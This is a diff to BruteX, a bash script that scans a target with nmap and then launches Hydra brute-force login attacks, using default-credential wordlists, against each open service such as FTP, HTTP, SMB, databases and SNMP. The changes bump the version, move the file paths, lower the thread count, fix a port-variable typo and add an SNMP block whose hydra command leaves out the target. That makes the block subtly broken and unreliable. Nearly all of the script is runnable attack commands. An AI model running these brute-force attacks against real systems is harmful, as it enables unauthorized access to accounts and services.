@@ -1,5 +1,5 @@
 #!/bin/bash 
-# BruteX v1.4 by 1N3
+# BruteX v1.5 by 1N3
 # http://crowdshield.com
 #
 # ABOUT:
@@ -11,8 +11,7 @@
 # DEPENDENCIES:
 # 1. NMap
 # 2. Hydra
-# 3. SNMPWalk
-# 4. DNSEnum
+# 3. DNSEnum
 #
 # HYDRA SERVICES: 
 # asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
@@ -20,18 +19,18 @@
 
 TARGET="$1"
 PORT="$2"
-LOOT_DIR=loot
-FTP_USER_PASS="wordlists/ftp-default-userpass.txt"
-MYSQL_USER_PASS="wordlists/mssql-default-userpass.txt"
-ORACLE_USER_PASS="wordlists/oracle-default-userpass.txt"
-POSTGRES_USER_PASS="wordlists/postgres-default-userpass.txt"
-WINDOWS_USER_LIST="wordlists/windows-users.txt"
-USER_FILE="wordlists/simple-users.txt"
-PASS_FILE="wordlists/password.lst"
-DNS_FILE="wordlists/namelist.txt"
-SNMP_FILE="wordlists/snmp-strings.txt"
+LOOT_DIR=/usr/share/brutex/loot
+FTP_USER_PASS="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
+MYSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
+ORACLE_USER_PASS="/usr/share/brutex/wordlists/oracle-default-userpass.txt"
+POSTGRES_USER_PASS="/usr/share/brutex/wordlists/postgres-default-userpass.txt"
+WINDOWS_USER_LIST="/usr/share/brutex/wordlists/windows-users.txt"
+USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
+PASS_FILE="/usr/share/brutex/wordlists/password.lst"
+DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
+SNMP_FILE="/usr/share/brutex/wordlists/snmp-strings.txt"
 HTTP_LOCATION="/"
-THREADS="30"
+THREADS="1"
 COLOR1='\033[91m'
 COLOR2='\033[92m'
 COLOR3='\033[92m'
@@ -48,7 +47,7 @@ if [ -z $TARGET ]; then
 	echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
 	echo -e "$COLOR1         \/                         \/      \_/$RESET"
 	echo ""
-	echo -e "$COLOR1 + -- --=[BruteX v1.3 by 1N3$RESET"
+	echo -e "$COLOR1 + -- --=[BruteX v1.5 by 1N3$RESET"
 	echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
 	echo -e "$COLOR1 + -- --=[Usage: brutex <target> <port>"
 	echo -e "$RESET"
@@ -65,7 +64,7 @@ echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
 echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
 echo -e "$COLOR1         \/                         \/      \_/$RESET"
 echo ""
-echo -e "$COLOR1 + -- --=[BruteX v1.3 by 1N3$RESET"
+echo -e "$COLOR1 + -- --=[BruteX v1.5 by 1N3$RESET"
 echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
 echo ""
 echo ""
@@ -96,15 +95,15 @@ port_513=`grep 'portid="513"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_512=`grep 'portid="514"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_993=`grep 'portid="993"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_1433=`grep 'portid="1521"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
+port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
+port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
-port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
 
 if [ -z "$port_21" ]
 then
@@ -144,7 +143,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 80 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 80 opened... running tests...$RESET"
-	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -t $THREADS -f -q -e ns -m $HTTP_LOCATION
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-get -t $THREADS -f -q -e ns -m $HTTP_LOCATION
 fi
 
 if [ -z "$port_110" ]
@@ -161,6 +160,14 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 139 opened... running tests...$RESET"
 	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 139 -t $THREADS -e ns
+fi
+
+if [ -z "$port_162" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 162 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 162 opened... running tests...$RESET"
+	hydra -L $SNMP_FILE -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
 fi
 
 if [ -z "$port_389" ]
